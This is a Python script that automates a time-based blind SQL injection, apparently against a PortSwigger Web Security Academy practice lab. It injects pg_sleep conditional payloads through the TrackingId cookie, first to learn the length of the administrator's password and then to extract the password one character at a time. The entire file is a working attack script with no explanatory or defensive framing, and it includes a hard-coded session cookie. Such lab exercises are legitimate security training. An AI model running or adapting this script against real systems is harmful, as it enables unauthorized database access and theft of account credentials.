import requests as r
import string

def send_request(payload):
    url = "https://0a4c000f03fa45e38076d5b900cd0033.web-security-academy.net/filter?category=Pets"
    headers = {
        "Cookie": "TrackingId=x" + payload + "; session=kukRsZILz3dczG8gFZPACAGgbVKEKVZg",
        "Sec-Ch-Ua": "\"Not/A)Brand\";v=\"8\", \"Chromium\";v=\"126\"",
        "Sec-Ch-Ua-Mobile": "?0",
        "Sec-Ch-Ua-Platform": "\"Windows\"",
        "Accept-Language": "fr-FR",
        "Upgrade-Insecure-Requests": "1",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.127 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-User": "?1",
        "Sec-Fetch-Dest": "document",
        "Referer": "https://0a4c000f03fa45e38076d5b900cd0033.web-security-academy.net/",
        "Accept-Encoding": "gzip, deflate, br",
        "Priority": "u=0, i"
    }

    response = r.get(url, headers=headers)
    return response

def get_password_length():
    length = 0
    while True:
        payload = "' || (SELECT CASE WHEN (username='administrator' AND LENGTH(password) = " + str(length) + ") THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users) --"
        response = send_request(payload)
        if response.elapsed.total_seconds() >= 5:
            return length
        else:
            length += 1

def main():
    password_length = get_password_length()
    letters = string.ascii_lowercase + string.digits
    password = ''
    for i in range(password_length):
        for letter in letters:
            payload = "' || (SELECT CASE WHEN (username='administrator' AND SUBSTRING(password," + str(i+1) + ",1) = '" + letter + "') THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users) --"
            response = send_request(payload)
            print(response.elapsed.total_seconds())
            if response.elapsed.total_seconds() >= 5:
                print(f"{letter}, {i}")
                password += letter
                break

    print(f"The password is: {password}")
    print(f"Its length is: {len(password)}")

if __name__ == "__main__":
    main()
